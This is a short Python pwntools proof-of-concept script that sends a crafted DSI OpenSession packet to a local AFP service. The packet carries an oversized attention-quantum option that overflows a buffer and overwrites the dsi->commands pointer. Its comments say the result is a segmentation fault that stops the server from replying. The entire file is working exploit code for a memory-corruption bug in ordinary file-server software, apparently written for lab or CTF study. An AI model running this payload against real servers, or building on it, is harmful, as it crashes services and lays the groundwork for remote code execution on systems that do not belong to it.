#!/usr/bin/env python3
from pwn import *

context(endian="big", log_level="debug")
io = remote("127.0.0.1", "5566")

# payload after the DSI header
# copy to &dsi->attn_quantum
# dsi_opensession | commands = opt(1 byte) + len_payload(1 byte) + payload(n byte)
dsi_opensession = b""
dsi_opensession += b"\x01"  # case: dsi->commands[i++] = DSIOPT_ATTNQUANT
dsi_opensession += p8(0x18)  # dsi->commands[i] is length data, use copy
dsi_opensession += b"aaaabbbbccccddee"
dsi_opensession += b"abcdefgh"
# string overwrite ptr *dsi->commands = character
# => Segmentation fault => server not reply data to clients.

dsi_header = b""
dsi_header += b"\x00"  # dsi_flags     | request flag = 0
dsi_header += b"\x04"  # dsi_command   | DSIFUNC_OPEN(0x4) = openSession
dsi_header += b"\x00\x01"  # dsi_requestID | request id
dsi_header += p32(0)  # dsi_data
dsi_header += p32(len(dsi_opensession))  # dsi_len       | commands len
dsi_header += p32(0)  # dsi_reversed

dsi_header += dsi_opensession  # payload

io.send(dsi_header)
context = io.recv()
log.success("Data recv: " + str(context))
io.close()
